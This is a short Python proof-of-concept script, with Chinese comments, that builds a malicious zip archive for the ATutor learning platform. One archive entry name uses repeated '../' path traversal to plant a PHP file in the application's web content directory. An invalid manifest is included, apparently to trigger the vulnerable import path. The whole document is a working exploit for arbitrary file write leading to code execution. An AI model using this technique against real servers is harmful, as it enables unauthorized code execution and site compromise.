import zipfile
from io import BytesIO  # 使用 BytesIO 替代 StringIO

def _build_zip():
    f = BytesIO()  # 使用 BytesIO 创建对象
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    z.writestr("../../../../../../../../opt/lampp/htdocs/atutor/content/poc.php4", "<?php phpinfo(); ?>")
    z.writestr('imsmanifest.xml', 'invalid xml!')
    z.close()
    zip = open('poc.zip', 'wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()
